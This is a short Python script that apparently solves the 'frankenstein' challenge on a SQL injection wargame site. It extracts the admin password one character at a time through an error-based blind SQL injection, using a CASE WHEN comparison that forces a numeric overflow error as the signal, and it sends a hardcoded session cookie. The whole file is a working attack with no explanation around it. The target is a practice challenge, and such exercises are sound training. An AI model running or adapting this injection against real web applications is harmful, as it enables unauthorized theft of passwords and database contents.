#-*- coding: utf-8 -*-
import requests

pw = ''
hex_pw = ''

for order in range(0,8):
    for p in range(48,123):
        url="https://los.rubiya.kr/chall/frankenstein_b5bab23e64777e1756174ad33f14b5db.php?pw=1' or case when id='admin' and pw < 0x"+str(hex_pw)+hex(p).split("0x")[1]+" then 9e307*2 else 0 end%23﻿"
        cookies={'PHPSESSID':'5sfp0t0s6s8fh4ve7d0i63u711'}
        res = requests.get(url,cookies= cookies)
        if '<hr><br>error' in res.text:
            pw=pw+chr(p-1)
            hex_pw += hex(p-1).split('0x')[1]
            print(pw)
            break
print(pw)
